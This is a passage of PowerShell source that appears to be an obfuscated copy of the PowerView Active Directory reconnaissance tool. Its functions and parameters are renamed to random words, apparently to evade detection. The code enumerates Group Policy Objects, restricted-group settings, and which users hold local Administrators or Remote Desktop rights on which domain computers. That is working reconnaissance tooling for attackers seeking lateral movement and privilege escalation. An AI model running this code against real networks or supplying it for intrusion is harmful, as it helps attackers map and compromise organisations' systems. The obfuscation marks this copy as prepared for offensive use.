                $UnVGlaOI99 += $MEFGOmzQ99.split(',') | ForEach-Object {
                    if($_.startswith('OU=')) {
                        $MEFGOmzQ99.SubString($MEFGOmzQ99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[funereal] object OUs: $UnVGlaOI99"
                if ($UnVGlaOI99) {
                    $VrICpjXS99.Remove('Properties')
                    $PvByVxwV99 = $False
                    ForEach($xoFZFxib99 in $UnVGlaOI99) {
                        $VrICpjXS99['Identity'] = $xoFZFxib99
                        $RLzlYNrw99 += alleluias @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $LWtrTYAJ99 = $Parts[1]
                                        if ($PvByVxwV99) {
                                            if ($LWtrTYAJ99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $PvByVxwV99 = $True
                            }
                        }
                    }
                }
                if ($kungVfvV99) {
                    $uCZWtsDx99 = (partakes -lgkTdAeF99 $kungVfvV99).SiteName
                    if($uCZWtsDx99 -and ($uCZWtsDx99 -notlike 'Error*')) {
                        $VrICpjXS99['Identity'] = $uCZWtsDx99
                        $RLzlYNrw99 += cooky @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $lxXlyUId99 = $MEFGOmzQ99.SubString($MEFGOmzQ99.IndexOf('DC='))
                $VrICpjXS99.Remove('Identity')
                $VrICpjXS99.Remove('Properties')
                $VrICpjXS99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$lxXlyUId99)"
                $RLzlYNrw99 += scram @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[funereal] GPOAdsPaths: $RLzlYNrw99"
                if ($gIZECdbV99) { $VrICpjXS99['Properties'] = $gIZECdbV99 }
                else { $VrICpjXS99.Remove('Properties') }
                $VrICpjXS99.Remove('Identity')
                $RLzlYNrw99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $VrICpjXS99['SearchBase'] = $_
                    $VrICpjXS99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    scram @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $hAflFVrb99 = ''
                $tGcqvLrx99 = ''
                $phaEiMpW99 | Where-Object {$_} | ForEach-Object {
                    $SvGoFRkz99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($SvGoFRkz99 -match 'LDAP://|^CN=.*') {
                        $hAflFVrb99 += "(distinguishedname=$SvGoFRkz99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $chKaCwXV99 = $SvGoFRkz99.SubString($SvGoFRkz99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[funereal] Extracted domain '$chKaCwXV99' from '$SvGoFRkz99'"
                            $VrICpjXS99['Domain'] = $chKaCwXV99
                            $gBhORdXe99 = indenturing @SearcherArguments
                            if (-not $gBhORdXe99) {
                                Write-Warning "[funereal] Unable to retrieve domain searcher for '$chKaCwXV99'"
                            }
                        }
                    }
                    elseif ($SvGoFRkz99 -match '{.*}') {
                        $hAflFVrb99 += "(name=$SvGoFRkz99)"
                    }
                    else {
                        try {
                            $PFeUtWYw99 = (-Join (([Guid]$SvGoFRkz99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $hAflFVrb99 += "(objectguid=$PFeUtWYw99)"
                        }
                        catch {
                            $hAflFVrb99 += "(displayname=$SvGoFRkz99)"
                        }
                    }
                }
                if ($hAflFVrb99 -and ($hAflFVrb99.Trim() -ne '') ) {
                    $tGcqvLrx99 += "(|$hAflFVrb99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[funereal] Using additional LDAP filter: $vqxjYeAS99"
                    $tGcqvLrx99 += "$vqxjYeAS99"
                }
                $gBhORdXe99.filter = "(&(objectCategory=groupPolicyContainer)$tGcqvLrx99)"
                Write-Verbose "[funereal] filter string: $($gBhORdXe99.filter)"
                if ($PSBoundParameters['FindOne']) { $jAOXTyAF99 = $gBhORdXe99.FindOne() }
                else { $jAOXTyAF99 = $gBhORdXe99.FindAll() }
                $jAOXTyAF99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($kNJfXSCC99 -Match '^GC://')) {
                            $GPO = favorites -PjvsRTzX99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $tUoOMnWl99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $aWtnzYjh99 = "\\$tUoOMnWl99\SysVol\$tUoOMnWl99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $aWtnzYjh99
                            }
                            catch {
                                Write-Verbose "[funereal] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = favorites -PjvsRTzX99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($jAOXTyAF99) {
                    try { $jAOXTyAF99.dispose() }
                    catch {
                        Write-Verbose "[funereal] Error disposing of the Results object: $_"
                    }
                }
                $gBhORdXe99.dispose()
            }
        }
    }
}
function wombs {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $phaEiMpW99,
        [Switch]
        $gIbEcDGP99,
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $vqxjYeAS99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Domain']) { $VrICpjXS99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['LDAPFilter']) { $VrICpjXS99['LDAPFilter'] = $gddrYpaX99 }
        if ($PSBoundParameters['SearchBase']) { $VrICpjXS99['SearchBase'] = $kNJfXSCC99 }
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VrICpjXS99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VrICpjXS99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VrICpjXS99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $mTIWqRmo99 = @{}
        if ($PSBoundParameters['Domain']) { $mTIWqRmo99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $mTIWqRmo99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $mTIWqRmo99['Credential'] = $xjRyyQze99 }
        $eEvwNlRf99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $VrICpjXS99['Identity'] = $phaEiMpW99 }
        funereal @SearcherArguments | ForEach-Object {
            $QiXQUuMz99 = $_.displayname
            $SitfjBbr99 = $_.name
            $HYzJKbUB99 = $_.gpcfilesyspath
            $ThYnVhtt99 =  @{ 'GptTmplPath' = "$HYzJKbUB99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $ThYnVhtt99['Credential'] = $xjRyyQze99 }
            $Inf = expending @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $CCCRZoxI99 = @{}
                ForEach ($eImHSEaZ99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $EFvzHePg99 = $eImHSEaZ99.Key.Split('__', $eEvwNlRf99) | ForEach-Object {$_.Trim()}
                    $RKJoIQuy99 = $eImHSEaZ99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $GduCtihv99 = @()
                        ForEach ($FEdwNfjR99 in $RKJoIQuy99) {
                            if ($FEdwNfjR99 -and ($FEdwNfjR99.Trim() -ne '')) {
                                if ($FEdwNfjR99 -notmatch '^S-1-.*') {
                                    $atgEMCyT99 = @{'ObjectName' = $FEdwNfjR99}
                                    if ($PSBoundParameters['Domain']) { $atgEMCyT99['Domain'] = $gddrYpaX99 }
                                    $KjCsuQHp99 = remissions @ConvertToArguments
                                    if ($KjCsuQHp99) {
                                        $GduCtihv99 += $KjCsuQHp99
                                    }
                                    else {
                                        $GduCtihv99 += $FEdwNfjR99
                                    }
                                }
                                else {
                                    $GduCtihv99 += $FEdwNfjR99
                                }
                            }
                        }
                        $RKJoIQuy99 = $GduCtihv99
                    }
                    if (-not $CCCRZoxI99[$Group]) {
                        $CCCRZoxI99[$Group] = @{}
                    }
                    if ($RKJoIQuy99 -isnot [System.Array]) {$RKJoIQuy99 = @($RKJoIQuy99)}
                    $CCCRZoxI99[$Group].Add($EFvzHePg99, $RKJoIQuy99)
                }
                ForEach ($eImHSEaZ99 in $CCCRZoxI99.GetEnumerator()) {
                    if ($eImHSEaZ99 -and $eImHSEaZ99.Key -and ($eImHSEaZ99.Key -match '^\*')) {
                        $CAsXSzun99 = $eImHSEaZ99.Key.Trim('*')
                        if ($CAsXSzun99 -and ($CAsXSzun99.Trim() -ne '')) {
                            $KegVfEPD99 = exaggerations -ObjectSID $CAsXSzun99 @ConvertArguments
                        }
                        else {
                            $KegVfEPD99 = $False
                        }
                    }
                    else {
                        $KegVfEPD99 = $eImHSEaZ99.Key
                        if ($KegVfEPD99 -and ($KegVfEPD99.Trim() -ne '')) {
                            if ($KegVfEPD99 -match 'Administrators') {
                                $CAsXSzun99 = 'S-1-5-32-544'
                            }
                            elseif ($KegVfEPD99 -match 'Remote Desktop') {
                                $CAsXSzun99 = 'S-1-5-32-555'
                            }
                            elseif ($KegVfEPD99 -match 'Guests') {
                                $CAsXSzun99 = 'S-1-5-32-546'
                            }
                            elseif ($KegVfEPD99.Trim() -ne '') {
                                $atgEMCyT99 = @{'ObjectName' = $KegVfEPD99}
                                if ($PSBoundParameters['Domain']) { $atgEMCyT99['Domain'] = $gddrYpaX99 }
                                $CAsXSzun99 = remissions @ConvertToArguments
                            }
                            else {
                                $CAsXSzun99 = $Null
                            }
                        }
                    }
                    $aSleattd99 = New-Object PSObject
                    $aSleattd99 | Add-Member Noteproperty 'GPODisplayName' $QiXQUuMz99
                    $aSleattd99 | Add-Member Noteproperty 'GPOName' $SitfjBbr99
                    $aSleattd99 | Add-Member Noteproperty 'GPOPath' $HYzJKbUB99
                    $aSleattd99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $aSleattd99 | Add-Member Noteproperty 'Filters' $Null
                    $aSleattd99 | Add-Member Noteproperty 'GroupName' $KegVfEPD99
                    $aSleattd99 | Add-Member Noteproperty 'GroupSID' $CAsXSzun99
                    $aSleattd99 | Add-Member Noteproperty 'GroupMemberOf' $eImHSEaZ99.Value.Memberof
                    $aSleattd99 | Add-Member Noteproperty 'GroupMembers' $eImHSEaZ99.Value.Members
                    $aSleattd99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $aSleattd99
                }
            }
            $ThYnVhtt99 =  @{
                'GroupsXMLpath' = "$HYzJKbUB99\MACHINE\Preferences\Groups\Groups.xml"
            }
            loadstone @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $GduCtihv99 = @()
                    ForEach ($FEdwNfjR99 in $_.GroupMembers) {
                        if ($FEdwNfjR99 -and ($FEdwNfjR99.Trim() -ne '')) {
                            if ($FEdwNfjR99 -notmatch '^S-1-.*') {
                                $atgEMCyT99 = @{'ObjectName' = $KegVfEPD99}
                                if ($PSBoundParameters['Domain']) { $atgEMCyT99['Domain'] = $gddrYpaX99 }
                                $KjCsuQHp99 = remissions -gddrYpaX99 $gddrYpaX99 -sskuJSha99 $FEdwNfjR99
                                if ($KjCsuQHp99) {
                                    $GduCtihv99 += $KjCsuQHp99
                                }
                                else {
                                    $GduCtihv99 += $FEdwNfjR99
                                }
                            }
                            else {
                                $GduCtihv99 += $FEdwNfjR99
                            }
                        }
                    }
                    $_.GroupMembers = $GduCtihv99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $QiXQUuMz99
                $_ | Add-Member Noteproperty 'GPOName' $SitfjBbr99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function Cardin {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $phaEiMpW99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $FJbkDBjb99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VGJwlvBj99 = @{}
        if ($PSBoundParameters['Domain']) { $VGJwlvBj99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $VGJwlvBj99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VGJwlvBj99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VGJwlvBj99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VGJwlvBj99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VGJwlvBj99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VGJwlvBj99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        $xGIgqgrp99 = @()
        if ($PSBoundParameters['Identity']) {
            $xGIgqgrp99 += scram @CommonArguments -phaEiMpW99 $phaEiMpW99 | Select-Object -Expand objectsid
            $ENecFcNI99 = $xGIgqgrp99
            if (-not $xGIgqgrp99) {
                Throw "[Cardin] Unable to retrieve SID for identity '$phaEiMpW99'"
            }
        }
        else {
            $xGIgqgrp99 = @('*')
        }
        if ($FJbkDBjb99 -match 'S-1-5') {
            $NmEIORAH99 = $FJbkDBjb99
        }
        elseif ($FJbkDBjb99 -match 'Admin') {
            $NmEIORAH99 = 'S-1-5-32-544'
        }
        else {
            $NmEIORAH99 = 'S-1-5-32-555'
        }
        if ($xGIgqgrp99[0] -ne '*') {
            ForEach ($SLqiOELZ99 in $xGIgqgrp99) {
                Write-Verbose "[Cardin] Enumerating nested group memberships for: '$SLqiOELZ99'"
                $xGIgqgrp99 += floors @CommonArguments -PjvsRTzX99 'objectsid' -uEvGMWlH99 $SLqiOELZ99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[Cardin] Target localgroup SID: $NmEIORAH99"
        Write-Verbose "[Cardin] Effective target domain SIDs: $xGIgqgrp99"
        $wdKpuNGc99 = wombs @CommonArguments -gIbEcDGP99 | ForEach-Object {
            $aSleattd99 = $_
            if ($aSleattd99.GroupSID -match $NmEIORAH99) {
                $aSleattd99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($xGIgqgrp99[0] -eq '*') -or ($xGIgqgrp99 -Contains $_) ) {
                        $aSleattd99
                    }
                }
            }
            if ( ($aSleattd99.GroupMemberOf -contains $NmEIORAH99) ) {
                if ( ($xGIgqgrp99[0] -eq '*') -or ($xGIgqgrp99 -Contains $aSleattd99.GroupSID) ) {
                    $aSleattd99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $wdKpuNGc99 | Where-Object {$_} | ForEach-Object {
            $SitfjBbr99 = $_.GPODisplayName
            $iEnMpsiB99 = $_.GPOName
            $HYzJKbUB99 = $_.GPOPath
            $CkFVftkZ99 = $_.GPOType
            if ($_.GroupMembers) {
                $NPCXSfbC99 = $_.GroupMembers
            }
            else {
                $NPCXSfbC99 = $_.GroupSID
            }
            $TBiCFkSC99 = $_.Filters
            if ($xGIgqgrp99[0] -eq '*') {
                $oztpAzuj99 = $NPCXSfbC99
            }
            else {
                $oztpAzuj99 = $ENecFcNI99
            }
            alleluias @CommonArguments -Raw -PjvsRTzX99 'name,distinguishedname' -wBMxOopZ99 $iEnMpsiB99 | ForEach-Object {
                if ($TBiCFkSC99) {
                    $SWqPgtGL99 = pickerels @CommonArguments -PjvsRTzX99 'dnshostname,distinguishedname' -kNJfXSCC99 $_.Path | Where-Object {$_.distinguishedname -match ($TBiCFkSC99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $SWqPgtGL99 = pickerels @CommonArguments -PjvsRTzX99 'dnshostname' -kNJfXSCC99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($SWqPgtGL99) {
                    if ($SWqPgtGL99 -isnot [System.Array]) {$SWqPgtGL99 = @($SWqPgtGL99)}
                    ForEach ($SLqiOELZ99 in $oztpAzuj99) {
                        $Object = scram @CommonArguments -phaEiMpW99 $SLqiOELZ99 -PjvsRTzX99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $sJkpOPAV99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $UhuGBLyT99 = New-Object PSObject
                        $UhuGBLyT99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $UhuGBLyT99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $UhuGBLyT99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $UhuGBLyT99 | Add-Member Noteproperty 'Domain' $gddrYpaX99
                        $UhuGBLyT99 | Add-Member Noteproperty 'IsGroup' $sJkpOPAV99
                        $UhuGBLyT99 | Add-Member Noteproperty 'GPODisplayName' $SitfjBbr99
                        $UhuGBLyT99 | Add-Member Noteproperty 'GPOGuid' $iEnMpsiB99
                        $UhuGBLyT99 | Add-Member Noteproperty 'GPOPath' $HYzJKbUB99
                        $UhuGBLyT99 | Add-Member Noteproperty 'GPOType' $CkFVftkZ99
                        $UhuGBLyT99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $UhuGBLyT99 | Add-Member Noteproperty 'ComputerName' $SWqPgtGL99
                        $UhuGBLyT99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $UhuGBLyT99
                    }
                }
            }
            cooky @CommonArguments -PjvsRTzX99 'siteobjectbl,distinguishedname' -wBMxOopZ99 $iEnMpsiB99 | ForEach-Object {
                ForEach ($SLqiOELZ99 in $oztpAzuj99) {
                    $Object = scram @CommonArguments -phaEiMpW99 $SLqiOELZ99 -PjvsRTzX99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $sJkpOPAV99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $UhuGBLyT99 = New-Object PSObject
                    $UhuGBLyT99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $UhuGBLyT99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $UhuGBLyT99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $UhuGBLyT99 | Add-Member Noteproperty 'IsGroup' $sJkpOPAV99
                    $UhuGBLyT99 | Add-Member Noteproperty 'Domain' $gddrYpaX99
                    $UhuGBLyT99 | Add-Member Noteproperty 'GPODisplayName' $SitfjBbr99
                    $UhuGBLyT99 | Add-Member Noteproperty 'GPOGuid' $iEnMpsiB99
                    $UhuGBLyT99 | Add-Member Noteproperty 'GPOPath' $HYzJKbUB99
                    $UhuGBLyT99 | Add-Member Noteproperty 'GPOType' $CkFVftkZ99
                    $UhuGBLyT99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $UhuGBLyT99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $UhuGBLyT99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $UhuGBLyT99
                }
            }
        }
    }
}
function repackaging {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $IvLqKyXl99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $NLVILZjr99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $FJbkDBjb99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $kNJfXSCC99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $yuycROvu99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $vUSyLBJJ99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Switch]
        $kQTByXSX99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VGJwlvBj99 = @{}
        if ($PSBoundParameters['Domain']) { $VGJwlvBj99['Domain'] = $gddrYpaX99 }
        if ($PSBoundParameters['Server']) { $VGJwlvBj99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['SearchScope']) { $VGJwlvBj99['SearchScope'] = $yuycROvu99 }
        if ($PSBoundParameters['ResultPageSize']) { $VGJwlvBj99['ResultPageSize'] = $vUSyLBJJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VGJwlvBj99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Tombstone']) { $VGJwlvBj99['Tombstone'] = $kQTByXSX99 }
        if ($PSBoundParameters['Credential']) { $VGJwlvBj99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $hThWIUne99 = pickerels @CommonArguments -phaEiMpW99 $IvLqKyXl99 -PjvsRTzX99 'distinguishedname,dnshostname'
            if (-not $hThWIUne99) {
                throw "[repackaging] Computer $IvLqKyXl99 not found. Try a fully qualified host name."
            }
            ForEach ($zNIilCKh99 in $hThWIUne99) {
                $rlXybxsn99 = @()
                $DN = $zNIilCKh99.distinguishedname
                $ijlFMmbH99 = $DN.IndexOf('OU=')
                if ($ijlFMmbH99 -gt 0) {
                    $zNOAsbmO99 = $DN.SubString($ijlFMmbH99)
                }
                if ($zNOAsbmO99) {
                    $rlXybxsn99 += alleluias @CommonArguments -kNJfXSCC99 $zNOAsbmO99 -vqxjYeAS99 '(gplink=*)' | ForEach-Object {
                        Select-String -MnfPrxTx99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($zNIilCKh99.dnshostname)"
                $uCZWtsDx99 = (partakes -lgkTdAeF99 $zNIilCKh99.dnshostname).SiteName
                if ($uCZWtsDx99 -and ($uCZWtsDx99 -notmatch 'Error')) {
                    $rlXybxsn99 += cooky @CommonArguments -phaEiMpW99 $uCZWtsDx99 -vqxjYeAS99 '(gplink=*)' | ForEach-Object {
                        Select-String -MnfPrxTx99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $rlXybxsn99 | wombs @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $aSleattd99 = $_
                    if($aSleattd99.GroupMembers) {
                        $NPCXSfbC99 = $aSleattd99.GroupMembers
                    }
                    else {
                        $NPCXSfbC99 = $aSleattd99.GroupSID
                    }
                    $NPCXSfbC99 | ForEach-Object {
                        $Object = scram @CommonArguments -phaEiMpW99 $_
                        $sJkpOPAV99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $pdlfTeiO99 = New-Object PSObject
                        $pdlfTeiO99 | Add-Member Noteproperty 'ComputerName' $zNIilCKh99.dnshostname
                        $pdlfTeiO99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $pdlfTeiO99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $pdlfTeiO99 | Add-Member Noteproperty 'ObjectSID' $_
                        $pdlfTeiO99 | Add-Member Noteproperty 'IsGroup' $sJkpOPAV99
                        $pdlfTeiO99 | Add-Member Noteproperty 'GPODisplayName' $aSleattd99.GPODisplayName
                        $pdlfTeiO99 | Add-Member Noteproperty 'GPOGuid' $aSleattd99.GPOName
                        $pdlfTeiO99 | Add-Member Noteproperty 'GPOPath' $aSleattd99.GPOPath
                        $pdlfTeiO99 | Add-Member Noteproperty 'GPOType' $aSleattd99.GPOType
                        $pdlfTeiO99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $pdlfTeiO99
                    }
                }
            }
        }
    }
}
function molding {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $NMaUgVLh99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $gddrYpaX99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $GejzMkbd99,
        [ValidateRange(1, 10000)]
        [Int]
        $cNGaYdSy99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $xjRyyQze99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $VrICpjXS99 = @{}
        if ($PSBoundParameters['Server']) { $VrICpjXS99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $VrICpjXS99['ServerTimeLimit'] = $cNGaYdSy99 }
        if ($PSBoundParameters['Credential']) { $VrICpjXS99['Credential'] = $xjRyyQze99 }
        $mTIWqRmo99 = @{}
        if ($PSBoundParameters['Server']) { $mTIWqRmo99['Server'] = $GejzMkbd99 }
        if ($PSBoundParameters['Credential']) { $mTIWqRmo99['Credential'] = $xjRyyQze99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $VrICpjXS99['Domain'] = $gddrYpaX99
            $mTIWqRmo99['Domain'] = $gddrYpaX99
        }
        if ($NMaUgVLh99 -eq 'All') {
